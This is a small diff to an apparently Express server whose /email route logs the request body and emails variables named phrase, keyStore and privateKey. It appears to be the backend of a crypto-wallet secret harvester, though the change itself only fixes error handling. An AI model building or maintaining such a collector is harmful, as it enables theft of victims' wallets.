@@ -16,12 +16,12 @@ app.post("/email", (req, res) => {
   console.log("Data: ", req.body);
   sendMail(phrase, keyStore, privateKey, function (err, data) {
     if (err) {
+      console.log(err);
       res.status(500).json({ message: "internal error" });
     } else {
       res.json({ message: "email sent" });
     }
   });
-  res.json({ message: "message received" });
 });
 
 app.get("/", (req, res) => {
